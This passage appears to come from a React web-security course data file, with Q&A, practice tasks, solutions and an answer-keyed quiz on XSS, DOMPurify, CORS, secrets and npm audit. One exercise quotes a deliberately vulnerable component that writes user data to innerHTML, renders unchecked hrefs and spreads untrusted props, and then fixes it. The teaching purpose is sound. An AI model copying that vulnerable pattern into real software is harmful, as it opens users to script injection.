      a: 'Read the report: severity, package, path, and whether it is a dev or production dependency. Run npm audit fix for compatible upgrades, upgrade the parent package or use npm overrides for transitive ones, avoid --force without testing, and automate with Dependabot/Renovate and an npm audit step in CI. Commit the lockfile and use npm ci for reproducible builds.',
      level: 'Medium',
    },
    {
      q: 'Can user-controlled data in style or props cause problems in React?',
      a: 'Yes. Spreading an untrusted object as props ({...data}) can inject dangerouslySetInnerHTML, href or event handlers. Untrusted URLs in style backgroundImage can leak data or load tracking pixels. Always pick specific fields from API data instead of spreading it, and validate URLs.',
      level: 'Hard',
    },
  ],
  practice: [
    {
      task: 'Create a SafeHtml component with DOMPurify that allows only basic formatting, forces all links to open in a new tab with rel="noopener noreferrer", and use it to render a product description from an API.',
      hint: 'DOMPurify.addHook("afterSanitizeAttributes", node => ...) lets you modify sanitized nodes.',
      solution: `import DOMPurify from 'dompurify';

DOMPurify.addHook('afterSanitizeAttributes', node => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

const CONFIG = {
  ALLOWED_TAGS: ['p', 'br', 'b', 'strong', 'i', 'em', 'ul', 'ol', 'li', 'a', 'h3', 'h4'],
  ALLOWED_ATTR: ['href'],
};

export function SafeHtml({ html, as: Tag = 'div', ...rest }) {
  const clean = DOMPurify.sanitize(html ?? '', CONFIG);
  // clean HTML from DOMPurify: reviewed in PR #123
  return <Tag {...rest} dangerouslySetInnerHTML={{ __html: clean }} />;
}

// usage
<SafeHtml className="prose" html={product.descriptionHtml} />`,
    },
    {
      task: 'Write a Vite config with a dev proxy so that fetch("/api/products") goes to http://localhost:5000/products during development, and explain in a comment why this avoids CORS.',
      hint: 'server.proxy with rewrite.',
      solution: `// vite.config.js
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:5000',
        changeOrigin: true,
        rewrite: path => path.replace(/^\\/api/, ''),
      },
    },
  },
});

// Why no CORS error: the browser calls http://localhost:5173/api/products,
// which is the SAME origin as the page. The Vite dev server (Node, not a browser)
// forwards it to :5000. Same-origin requests never trigger CORS checks.
// In production, configure CORS on the API or serve both under one domain.`,
    },
    {
      task: 'Write an Express CORS configuration that allows only your local dev URL and production domain, supports cookies, and rejects everything else.',
      hint: 'cors({ origin: (origin, cb) => ..., credentials: true }).',
      solution: `import express from 'express';
import cors from 'cors';

const app = express();
const allowed = ['http://localhost:5173', 'https://shop.in', 'https://www.shop.in'];

app.use(cors({
  origin(origin, callback) {
    // allow server-to-server / curl (no Origin header) and known frontends
    if (!origin || allowed.includes(origin)) return callback(null, true);
    return callback(new Error('Not allowed by CORS'));
  },
  credentials: true,                      // needed for cookies; cannot be used with '*'
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));`,
    },
    {
      task: 'Find and fix the security issues in this component: function Profile({ user }) { const ref = useRef(); useEffect(() => { ref.current.innerHTML = user.bio; }, [user]); return <div><a href={user.site}>Site</a><div ref={ref} /><div {...user.extraProps} /></div>; }',
      hint: 'There are three problems: innerHTML, unchecked href, and spreading untrusted props.',
      solution: `import DOMPurify from 'dompurify';

const isSafeUrl = v => {
  try { return ['http:', 'https:'].includes(new URL(v).protocol); } catch { return false; }
};

function Profile({ user }) {
  return (
    <div>
      {/* 1. validate the URL protocol */}
      {isSafeUrl(user.site) && (
        <a href={user.site} target="_blank" rel="noopener noreferrer">Site</a>
      )}
      {/* 2. no direct innerHTML: plain text bio (or sanitize if HTML is required) */}
      <p>{user.bio}</p>
      {/* <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(user.bio) }} /> */}
      {/* 3. never spread untrusted objects: pick known safe fields */}
      <div className="badge" title={String(user.badgeTitle ?? '')} />
    </div>
  );
}`,
    },
    {
      task: 'Write a GitHub Actions job that installs dependencies reproducibly, runs the build, and fails if production dependencies have high or critical vulnerabilities.',
      hint: 'actions/setup-node with cache: npm, then npm ci and npm audit.',
      solution: `# .github/workflows/security.yml
name: security
on: [pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
      - run: npm ci
      - run: npm run build
      - name: Audit production dependencies
        run: npm audit --omit=dev --audit-level=high`,
    },
  ],
  quiz: [
    {
      question: 'Which JSX is vulnerable to XSS if comment comes from users?',
      options: ['<p>{comment}</p>', '<p title={comment}>Hi</p>', '<p dangerouslySetInnerHTML={{ __html: comment }} />', '<input value={comment} readOnly />'],
      answer: 2,
      explanation: 'dangerouslySetInnerHTML parses the string as HTML; the others are escaped by React.',
    },
    {
      question: 'Where should a Razorpay key_secret or OpenAI API key be stored?',
      options: ['In a VITE_ env variable', 'In localStorage after login', 'Hard-coded in a minified file', 'In the server / serverless function environment'],
      answer: 3,
      explanation: 'Anything in the frontend bundle is public; secrets live only on the server.',
    },
    {
      question: 'Who fixes a CORS error for a production API?',
      options: ['The API server, by sending the right Access-Control-Allow-* headers', 'React, by adding a header to fetch', 'The user, by disabling browser security', 'Nobody, CORS cannot be fixed'],
      answer: 0,
      explanation: 'CORS is enforced by the browser but configured on the server.',
    },
    {
      question: 'What is the main benefit of a Content Security Policy?',
      options: ['It encrypts traffic', 'It blocks scripts and resources from sources you did not allow, limiting XSS', 'It makes the bundle smaller', 'It replaces authentication'],
      answer: 1,
      explanation: 'CSP tells the browser which sources are allowed, so injected scripts are refused.',
    },
    {
      question: 'Which command checks only production dependencies for high-severity issues?',
      options: ['npm audit fix --force', 'npm outdated', 'npm audit --omit=dev --audit-level=high', 'npm ci --production'],
      answer: 2,
      explanation: '--omit=dev skips dev tooling and --audit-level=high sets the failure threshold.',
    },
  ],
};
